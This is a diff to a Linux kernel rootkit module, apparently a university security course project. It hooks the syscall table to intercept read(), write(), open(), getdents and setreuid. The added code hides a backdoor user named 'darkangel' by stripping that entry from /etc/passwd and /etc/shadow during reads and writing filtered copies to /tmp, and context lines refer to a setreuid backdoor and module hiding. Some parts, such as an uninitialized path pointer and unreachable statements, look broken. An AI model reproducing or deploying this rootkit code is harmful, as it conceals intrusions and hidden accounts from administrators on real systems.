@@ -28,7 +28,8 @@ void **sys_call_table = (void *)0xffffffff81801300;
 asmlinkage long (*original_write)(unsigned int, const char*, size_t);
 asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64*, unsigned int);
 asmlinkage long (*original_setreuid)(uid_t, uid_t);
-asmlinkage long (*original_open) (const char*, int, int);
+asmlinkage long (*original_open)(const char*, int, int);
+asmlinkage long (*original_read)(unsigned int, char *buf, size_t);
 
 // Extern symbols here:
 extern char rk_buf[BUFLEN];
@@ -38,18 +39,21 @@ extern asmlinkage int my_getdents(unsigned int, struct linux_dirent64*, unsigned
 
 static struct list_head *saved_mod_list_head;
 struct kobject *saved_kobj_parent;
+struct file* hide_contents(char* file, char* target, char* hidden);
 
 /*By Chen
  *
  * in buf special types: 4B + 8B_prifix+ strlen(TARGET)+4B_surfix + 2B(white space) 
- *
+ * Original code is implemented in:
+ * SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)
+ * in fs\read_write.c (MACRO!!!!)
  * */
 asmlinkage long 
-my_write(unsigned int fd, const char *buf, size_t nbyte){	
+my_write(unsigned int fd, char *buf, size_t nbyte){
 	//char *index1, *index2;
 	//char *hide_str = "test";
 	//bool is_special = 1;
-//	char *str2 = "flush.sh";
+	//	char *str2 = "flush.sh";
 	if(fd == 1){
 		
 //		if(index1 = strstr(buf, hide_str)){
@@ -66,6 +70,91 @@ my_write(unsigned int fd, const char *buf, size_t nbyte){
 //		}
 	}	
 	return original_write(fd, buf, nbyte);
+}
+
+asmlinkage long
+my_read(unsigned int fd, char *buf, size_t count) {
+	
+	struct file *file;
+	ssize_t ret = -EBADF;
+	file = fget(fd);
+	
+	u64 file_inode;
+	dev_t file_dev;
+	umode_t file_mode;
+	loff_t file_size;
+	int r;
+	
+	char* file_name, file_parent;
+	char *ptr1, *ptr2, *ptr3;
+	char *passwd = "passwd";
+	char *shadow = "shadow";
+	char *hide_str = "darkangel";	// ptr2
+	char *delimiter = "\n";	// ptr3
+	int i, buf_len_to_copy;
+	
+	struct kstat file_ksp;
+	r = vfs_stat(file, &file_ksp);
+	file_inode = file_ksp.ino;
+	file_dev = file_ksp.dev;
+	file_mode = file_ksp.mode;
+	file_size = file_ksp.size;
+	//char* abs_path;
+	
+	struct nameidata nd;
+	struct path *file_path;
+	
+	if (file) {
+		file_name = file->f_path.dentry->d_name.name;
+		//file_parent = file->f_dentry->d_parent->d_name.name;
+		vfs_path_lookup(file->f_dentry, file->f_vfsmnt, passwd, LOOKUP_ROOT, file_path);
+		//printk("filename: %s\n", file_name);
+		loff_t pos = file->f_pos;
+		
+		if((strcmp(file_name, passwd) == 0 || strcmp(file_name, shadow) == 0) && strlen(buf) > 0) {
+			//abs_path = dentry_path(file->f_path.dentry, file_name, strlen(file_name));
+			
+			printk("filename(%s): %s, inode: 0x%x\n", file_path, file_name, file_inode);
+			printk("dev: 0x%x, mode: 0x%x, size: 0x%x\n", file_dev, file_mode, file_size);
+			printk("[FD]: 0x%x, [count]: 0x%x, [Org_Buf_Size]:0x%x\n", fd, count, strlen(buf));
+			
+			printk("[!!!!!] pos: 0x%x\n", pos);
+			
+			ptr1 = buf;
+			ptr2 = strstr(buf, hide_str);
+			ptr3 = ptr2;
+			while (*ptr3 != *delimiter)
+				ptr3++;
+
+			buf_len_to_copy = (ptr1 + strlen(buf) - ptr3);
+			printk("buf_len_to_copy: %d\n", buf_len_to_copy);
+			printk("Ptr1(Contents): %p, Ptr2(hide_str): %p, Ptr3(end hide_str): %p\n", ptr1, ptr2, ptr3);
+			
+			//memcpy(ptr2, ptr3, buf_len_to_copy);
+			
+			
+			ptr3++;
+			for (i = 0; i < buf_len_to_copy; i++)
+				*ptr2++ = *ptr3++;
+			buf[(void*)ptr2 - (void*)ptr1] = NULL;
+			
+			
+			ret = vfs_read(file, buf, strlen(buf), ptr1);
+			//file->f_pos = pos;
+			
+			printk("[!!!!!] pos2: 0x%x\n", file->f_pos);
+			return ret;
+			printk("[End_Buf_Size]: 0x%x\n", strlen(buf));
+			printk("%s\n", buf);
+		}
+		
+		ret = vfs_read(file, buf, count, &pos);
+		file->f_pos = pos;
+		fput(file);
+	}
+
+	return ret;
+	//return original_read(fd, buf, count);
 }
 
 /* BACKDOOR by Koo: 
@@ -97,16 +186,91 @@ my_setreuid(uid_t ruid, uid_t euid) {
 	return original_setreuid(ruid, euid);
 }
 
+// file = [pwd | shadow]
+// target = [tmppwd | tmpshadow]
+struct file* hide_contents(char* file, char* target, char* hidden) {
+	// MIGHT CONTAIN A BUG HERE
+	struct file *fp = NULL;
+	struct file *fp_target = NULL;
+	
+	struct kstat file_ksp, target_ksp;
+	char *contents;
+	char *line;
+	
+	char *delim = "\n";
+	loff_t file_size;
+	u64 file_inode, target_inode;
+	int r1, r2;
+	
+	mm_segment_t prev_fs;
+	// Get the current FS segment descriptor
+	prev_fs = get_fs();
+	// Set the segment descriptor in kernel
+	set_fs(KERNEL_DS);
+	
+	r1 = vfs_stat(file, &file_ksp);
+	r2 = vfs_stat(target, &target_ksp);
+	file_inode = file_ksp.ino;
+	target_inode = target_ksp.ino;
+	
+	file_size = file_ksp.size;
+	fp = filp_open(file, O_RDONLY, 0);
+	
+	//fp_target = filp_open(target, flags, mode);
+	fp_target = filp_open(target, O_WRONLY|O_CREAT, 0644);
+	
+	contents = (char *) kmalloc(sizeof(char) * file_size, __GFP_IO);
+	vfs_read(fp, contents, file_size, &fp->f_pos);
+	//printk(KERN_INFO "Filesize: %lld\n", file_size);
+
+	while((line = strsep(&contents, delim)) != NULL) {
+		if(strncmp(line, hidden, strlen(hidden)) == 0) {
+			//vfs_write(fp_target, delim, strlen(delim), &fp_target->f_pos);
+			continue;
+		}
+		else {
+			vfs_write(fp_target, line, strlen(line), &fp_target->f_pos);
+			vfs_write(fp_target, delim, strlen(delim), &fp_target->f_pos);
+		}
+	}
+	
+	filp_close(fp, NULL);
+	//filp_close(fp_target, NULL);
+	
+	// Reset the segment descriptor
+	set_fs(prev_fs);
+	return fp_target;
+}
+
+
 /* Koo: 
  *
- * Checking if the target is open 
- *
+ * Checking if the file to open is the target to manipulate its content
+ * 		ssize_t vfs_read(struct file *, char __user *, size_t, loff_t *);
+ * 		ssize_t vfs_write(struct file *, const char __user *, size_t, loff_t *);
  * */
 asmlinkage long
 my_open(const char* file, int flags, int mode) {
-	const char* target = "kcr.c";
-	if (strncmp(target, file, strlen(file)) == 0)
-		printk(KERN_INFO "Target detected!\n");
+	/* 
+	char *pwd = "/etc/passwd";
+	char *shadow = "/etc/shadow";
+	char *tmppwd = "/tmp/tmppwd";
+	char *tmpshadow = "/tmp/tmpshadow";
+	char *hidden = "darkangel";
+	
+	if (strncmp(file, pwd, strlen(file)) == 0) {
+		//printk("file inode = %p, passwd inode = %p\n", (void*)file_inode, (void*)pwd_inode);
+		//hide_contents(pwd, tmppwd, hidden);
+		printk("%s - mode: %d\n", pwd, mode);
+	}
+	
+	if (strncmp(file, shadow, strlen(file)) == 0) {
+		//printk("file inode = %p, shadow inode = %p\n", (void*)file_inode, (void*)shadow_inode);
+		//hide_contents(shadow, tmpshadow, hidden);
+		printk("%s - mode: %d\n", shadow, mode);
+	}
+	*/
+	
 	return original_open(file, flags, mode);
 }
 
@@ -178,6 +342,7 @@ __init init_mod(void) {
 	original_getdents = sys_call_table[__NR_getdents64];	// __NR_getdents64 61
 	original_setreuid = sys_call_table[__NR_setreuid];		// __NR_setreuid 145
 	original_open = sys_call_table[__NR_open];				// __NR_open 1024
+	original_read = sys_call_table[__NR_read];				// __NR_open 63
 	
 	// Set system call table to be writable by changing cr0 register
 	PROT_DISABLE;
@@ -187,6 +352,7 @@ __init init_mod(void) {
 	sys_call_table[__NR_getdents64] = my_getdents;
 	sys_call_table[__NR_setreuid] = my_setreuid;
 	sys_call_table[__NR_open] = my_open;
+	sys_call_table[__NR_read] = my_read;
 	
 	if (DEBUG == 1) {
 		printk(KERN_INFO "Original/Hooked syscall for write(): 0x%p / 0x%p\n", 
@@ -197,13 +363,15 @@ __init init_mod(void) {
 			(void*)original_setreuid, (void*)my_setreuid);
 		printk(KERN_INFO "Original/Hooked syscall for open(): 0x%p / 0x%p\n", 
 			(void*)original_open, (void*)my_open);
+		printk(KERN_INFO "Original/Hooked syscall for read(): 0x%p / 0x%p\n", 
+			(void*)original_read, (void*)my_read);
 	}
 	
 	//Changing the control bit back
 	PROT_ENABLE;
 	
-	hiding_module();
-	unhiding_module();
+	//hiding_module();
+	//unhiding_module();
 	
 	return 0;
 }
@@ -220,6 +388,7 @@ __exit exit_mod(void){
 	sys_call_table[__NR_getdents64] = original_getdents;
 	sys_call_table[__NR_setreuid] = original_setreuid;
 	sys_call_table[__NR_open] = original_open;
+	sys_call_table[__NR_read] = original_read;
 	PROT_ENABLE;
 	
 	if (DEBUG == 1) {
@@ -239,4 +408,4 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hykoo & yaohchen");
 MODULE_DESCRIPTION("CSE509-PJT");
 MODULE_VERSION("0.1");
-MODULE_SUPPORTED_DEVICE("Tested with kernel 3.2.0-29-generic in Ubuntu")
+MODULE_SUPPORTED_DEVICE("Tested with kernel 3.2.0-29-generic in Ubuntu");
